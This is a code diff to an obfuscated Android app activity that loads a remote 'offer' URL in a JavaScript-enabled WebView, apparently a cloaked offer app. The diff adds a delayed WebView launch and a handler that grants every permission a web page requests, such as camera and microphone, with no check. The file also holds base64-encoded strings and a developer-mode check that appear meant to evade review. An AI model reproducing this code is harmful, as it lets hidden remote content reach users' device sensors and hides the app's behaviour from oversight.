@@ -1,5 +1,6 @@
 package com.lyurxu.jroek;
 
+import static com.lyurxu.jroek.F_B_K.AD_ID;
 import static com.lyurxu.jroek.F_B_K.strDeep;
 import static com.lyurxu.jroek.ParseStr.decode;
 
@@ -10,8 +11,10 @@ import android.content.SharedPreferences;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Handler;
 import android.util.Log;
 import android.view.View;
+import android.webkit.PermissionRequest;
 import android.webkit.ValueCallback;
 import android.webkit.WebChromeClient;
 import android.webkit.WebSettings;
@@ -46,6 +49,7 @@ public class LJ extends AppCompatActivity {
     public static String strAppsFlyer;
     public static String AppsFl_Id;
     public static boolean afLoaded;
+    public static boolean adIdInited;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -79,14 +83,24 @@ public class LJ extends AppCompatActivity {
                             sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                             link = sPrefs.getString(URL_SHARED_PREF, null);
 
-                            if (link != null) {
-                                webView.loadUrl(link);
-                            } else {
-                                do {
-                                }
-                                while (!afLoaded);
-                                startWebView(offer);
-                            }
+//                            do {} while (!(afLoaded & AD_ID != null));
+//                            startWebView(offer);
+
+                            // TODO uncomment
+//                            if (link != null) {
+//                                webView.loadUrl(link);
+//                            } else {
+//                                do {
+//                                }
+//                                while (!(afLoaded & adIdInited));
+
+                                new Handler().postDelayed(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        startWebView(offer);
+                                    }
+                                },5000);
+  //                          }
                         } catch (IOException e) {
                             e.printStackTrace();
                         }
@@ -153,13 +167,11 @@ public class LJ extends AppCompatActivity {
         }
     }
 
-
     private boolean devModeOff() {
         int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                 android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
         return devInt == 0;
     }
-
 
     class MyWebChromeClient extends WebChromeClient {
         @Override
@@ -167,6 +179,11 @@ public class LJ extends AppCompatActivity {
             myFilePathCallback = filePathCallback;
             startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decode("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODE);
             return true;
+        }
+
+        @Override
+        public void onPermissionRequest(PermissionRequest request) {
+            request.grant(request.getResources());
         }
     }
 
@@ -191,7 +208,6 @@ public class LJ extends AppCompatActivity {
             editor.apply();
         }
     }
-
 
     private void setWebView(WebView webViewetgpy) {
         webViewetgpy.getSettings().setJavaScriptEnabled(true);
